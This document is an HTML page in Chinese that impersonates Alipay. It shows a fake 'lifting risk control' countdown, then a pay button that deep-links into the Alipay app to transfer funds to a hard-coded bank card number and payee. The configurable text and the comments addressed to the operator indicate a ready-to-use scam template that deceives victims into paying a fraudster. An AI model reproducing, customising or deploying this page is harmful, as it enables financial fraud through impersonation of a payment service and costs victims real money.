<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>支付宝转账到银行卡</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Microsoft YaHei", sans-serif;
        }
        body {
            background-color: #fff;
            padding: 20px 15px;
        }
        .header {
            font-size: 18px;
            color: #333;
            margin-bottom: 30px;
        }
        .main-title {
            font-size: 24px;
            color: #f00;
            text-align: center;
            margin: 20px 0;
            font-weight: bold;
        }
        .tips-text {
            font-size: 16px;
            color: #0066cc;
            text-align: center;
            margin-bottom: 30px;
        }
        .forwarder {
            font-size: 22px;
            color: #0066cc;
            text-align: center;
            margin: 40px 0;
        }
        .risk-btn {
            width: 90%;
            height: 60px;
            line-height: 60px;
            background-color: #4cd964;
            border-radius: 8px;
            margin: 0 auto;
            text-align: center;
            font-size: 20px;
            color: #f00;
            font-weight: bold;
        }
        .warm-tips {
            margin-top: 50px;
            padding: 0 15px;
        }
        .tips-title {
            font-size: 18px;
            color: #333;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .tips-list {
            font-size: 16px;
            color: #0066cc;
            line-height: 2.2;
        }
        .jump-btn {
            width: 90%;
            height: 60px;
            line-height: 60px;
            background-color: #4cd964;
            border: none;
            border-radius: 8px;
            margin: 20px auto;
            display: block;
            text-align: center;
            font-size: 20px;
            color: #f00;
            font-weight: bold;
            cursor: pointer;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header" id="headerText">← 转发</div>
    <h1 class="main-title" id="mainTitle">正在为您转发</h1>
    <p class="tips-text" id="tipsText">倒计时结束后，请点击下方按钮进行付款</p>
    <p class="forwarder" id="forwarderText">转发人：谭显鹏</p>
    <div class="risk-btn" id="countdownBox">
        <span id="riskText">正在解除风控</span>(<span id="countdown">37</span>)
    </div>
    <button class="jump-btn" id="jumpBtn">点击进行付款/转发</button>
    <div class="warm-tips">
        <h3 class="tips-title" id="warmTipsTitle">温馨提示</h3>
        <div class="tips-list" id="warmTipsContent">
            1.正在为你排查，请耐心等待。<br>
            2.问题排除后，点击转发按钮进行转发。<br>
            如遇任何问题，请联系客服。
        </div>
    </div>

    <script>
        // ========== 所有文字/配置都在这里修改 ==========
        const config = {
            // 倒计时与跳转配置（已嵌入你的支付宝链接）
            countdownTime: 30, // 倒计时秒数
            targetUrl: "https://ds.alipay.com/?scheme=alipays://platformapi/startapp?appId=09999988%26actionType=toCard%26sourceId=bill%26bankAccount=龙润堂%26cardNo=6216657000037314475%26#money=%26amount=%26bankMark=BOC%26cardIndex=%26cardNoHidden=true%26c", // 你的支付宝跳转链接
            // 页面文字配置
            headerText: "", // 顶部返回文字
            mainTitle: "支付宝正在为您解除风控", // 主标题
            tipsText: "倒计时结束后，请点击下方按钮进行付款", // 提示文案
            forwarderText: "收款人：龙润堂", // 收款人信息
            riskText: "正在解除风控", // 风控提示文字
            jumpBtnText: "点击进行付款", // 跳转按钮文字
            warmTipsTitle: "温馨提示", // 温馨提示标题
            warmTipsContent: `1.支付宝正在为您排除可疑交易，请耐心等待。<br>2.风控排除后，点击付款按钮进行付款。<br>如遇任何问题，请联系收款方。` // 温馨提示内容
        };
        // ========== 配置结束，无需修改下方代码 ==========

        // 初始化页面文字
        document.getElementById("headerText").innerText = config.headerText;
        document.getElementById("mainTitle").innerText = config.mainTitle;
        document.getElementById("tipsText").innerText = config.tipsText;
        document.getElementById("forwarderText").innerText = config.forwarderText;
        document.getElementById("riskText").innerText = config.riskText;
        document.getElementById("jumpBtn").innerText = config.jumpBtnText;
        document.getElementById("warmTipsTitle").innerText = config.warmTipsTitle;
        document.getElementById("warmTipsContent").innerHTML = config.warmTipsContent;

        // 倒计时逻辑
        const countdownEl = document.getElementById("countdown");
        const countdownBoxEl = document.getElementById("countdownBox");
        const jumpBtnEl = document.getElementById("jumpBtn");
        let count = config.countdownTime;

        const timer = setInterval(() => {
            count--;
            countdownEl.innerText = count;
            if (count <= 0) {
                clearInterval(timer);
                countdownBoxEl.style.display = "none";
                jumpBtnEl.style.display = "block";
            }
        }, 1000);

        // 点击跳转至你的支付宝链接
        jumpBtnEl.addEventListener("click", () => {
            window.location.href = config.targetUrl;
        });
    </script>
</body>
</html>
